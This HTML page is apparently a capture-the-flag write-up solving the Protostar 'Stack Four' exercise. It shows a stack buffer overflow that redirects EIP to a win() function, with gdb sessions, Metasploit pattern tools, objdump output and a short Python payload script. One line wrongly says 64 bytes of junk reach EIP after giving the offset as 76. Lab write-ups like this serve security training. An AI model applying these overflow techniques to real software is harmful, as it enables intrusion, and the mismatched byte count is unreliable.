<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>pwncone.io</title>
    <link rel="stylesheet" href="../../../../css/style.css">
  </head>

<body>

<section>

    <writeup>
        <h1><strong>#Protostar - Stack Four</strong></h1>
        <a href="https://exploit.education/protostar/stack-four/">https://exploit.education/protostar/stack-four/</a><br>
        <br>
        <img alt="images\21-1.png" src="images/21-1.png"><br>
        <br>
        To solve Stack Four, we need to redirect code execution to the <code>win()</code> function.<br>
        <br>
        To redirect code execution, we need to overwrite EIP with the address of win().<br>
        EIP is the Instruction Pointer. It points to the next instruction for the CPU to execute.<br>
        If we can overwrite EIP, we have code execution over the whole program/system.<br>
        <br>
        Before we can write this exploit, we need 2 things:<br>
        - the offset to EIP (so that we can overwrite it)<br>
        - the address of the win() function<br>
        <br>
        <a id="h2-1" name="h2-1"></a><strong></strong>
        <h2><strong>1) Find offset to EIP</strong></h2><br>
        Log into Protostar and open the stack4 binary in gdb.<br>
            <div class="codebox">
                $&nbsp;gdb&nbsp;-q&nbsp;stack4<br>
                Reading&nbsp;symbols&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>protostar<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack4...done.<br>
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;
            </div>
        </div><br>
        <br>
        On your attacking machine, generate a cyclic pattern using <code>msf-pattern_create</code>.<br>
        On Kali this is located at <code>/usr/share/metasploit-framework/tools/pattern_create.rb</code><br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>exploit-education<span style="color:#ff9d00;font-weight:700">/</span>protostar]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#msf-pattern_create&nbsp;-l&nbsp;100</span><br>
                Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
            </div>
        </div><br>
        <br>
        Back in gdb, run the binary and submit the cyclic pattern.<br>
        The binary should crash.<br>
            <div class="codebox">
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;run<br>
                Starting&nbsp;program<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>protostar<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack4&nbsp;<br>
                Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A<br>
                <br>
                Program&nbsp;received&nbsp;signal&nbsp;SIGSEGV,&nbsp;Segmentation&nbsp;fault.<br>
                0x63413563&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;??&nbsp;<span style="color:#ff9d00;font-weight:700">()</span>
            </div>
        </div><br>
        <br>
        The stack has been overflowed and EIP has been overwritten with <code>0x63413563</code>, which is part of our cyclic pattern.<br>
        <br>
        Submit the contents of EIP to <code>msf-pattern_offset</code>.<br>
        This will tell us the offset at which EIP gets overwritten.<br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>exploit-education<span style="color:#ff9d00;font-weight:700">/</span>protostar]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#msf-pattern_offset&nbsp;-q&nbsp;0x63413563&nbsp;</span><br>
                [*]&nbsp;Exact&nbsp;match&nbsp;at&nbsp;offset&nbsp;76
            </div>
        </div><br>
        <br>
        The offset to overwrite EIP is <code>76</code>,<br>
        which means that we need to write 64 bytes of junk to overflow the buffer and reach EIP.<br>
        <br>
        <a id="h2-2" name="h2-2"></a><strong></strong>
        <h2><strong>2) Find win() address</strong></h2><br>
        Next, we need to find the memory address of the win() function in the binary.<br>
        For this, you can use objdump.<br>
            <div class="codebox">
                $&nbsp;objdump&nbsp;-M&nbsp;intel&nbsp;-d&nbsp;stack4&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;win&nbsp;-A&nbsp;5<br>
                080483f4&nbsp;&lt;win&gt;<span style="color:#ff9d00;font-weight:700">:</span><br>
                &nbsp;80483f4<span style="color:#ff9d00;font-weight:700">:</span> 55&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp;ebp<br>
                &nbsp;80483f5<span style="color:#ff9d00;font-weight:700">:</span> 89&nbsp;e5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;ebp,esp<br>
                &nbsp;80483f7<span style="color:#ff9d00;font-weight:700">:</span> 83&nbsp;ec&nbsp;18&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sub&nbsp;&nbsp;&nbsp;&nbsp;esp,0x18<br>
                &nbsp;80483fa<span style="color:#ff9d00;font-weight:700">:</span> c7&nbsp;04&nbsp;24&nbsp;e0&nbsp;84&nbsp;04&nbsp;08&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;PTR&nbsp;[esp],0x80484e0<br>
                &nbsp;8048401<span style="color:#ff9d00;font-weight:700">:</span> e8&nbsp;26&nbsp;ff&nbsp;ff&nbsp;ff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp;&nbsp;804832c&nbsp;&lt;puts@plt&gt;
            </div>
        </div><br>
        <br>
        The win() function is located at <code>0x080483f4</code><br>
        <br>
        <a id="h2-3" name="h2-3"></a><strong></strong>
        <h2><strong>3) Write exploit</strong></h2><br>
        First, we write 76 bytes of junk to fill the <code>buffer</code> variable.<br>
        After that, we overwrite EIP with the address of the win() function.<br>
        <br>
            <div class="codebox">
                <span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;exploit.education&nbsp;-&nbsp;Stack&nbsp;Four</span><br>
                <br>
                import&nbsp;struct<br>
                <br>
                win_address&nbsp;=&nbsp;struct.pack<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'&lt;I'</span>,&nbsp;0x080483f4<span style="color:#ff9d00;font-weight:700">)</span><br>
                <br>
                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*76<br>
                payload&nbsp;+=&nbsp;win_address<br>
                <br>
                print&nbsp;payload
            </div>
        </div><br>
        <br>
        <a id="h2-4" name="h2-4"></a><strong></strong>
        <h2><strong>4) Win</strong></h2><br>
        Print your payload by running the exploit and pipe it to stack4.<br>
            <div class="codebox">
                $&nbsp;python&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>stack4.py&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>stack4<br>
                code&nbsp;flow&nbsp;successfully&nbsp;changed<br>
                Segmentation&nbsp;fault
            </div>
        </div><br>
        <br>
        Success!<br>
        We've overwritten EIP and changed code execution to the win() funciton.<br>
        The binary seg faults after exitnig because we've overwritten EIP.<br>
    </writeup>
</section>
</body>
</html>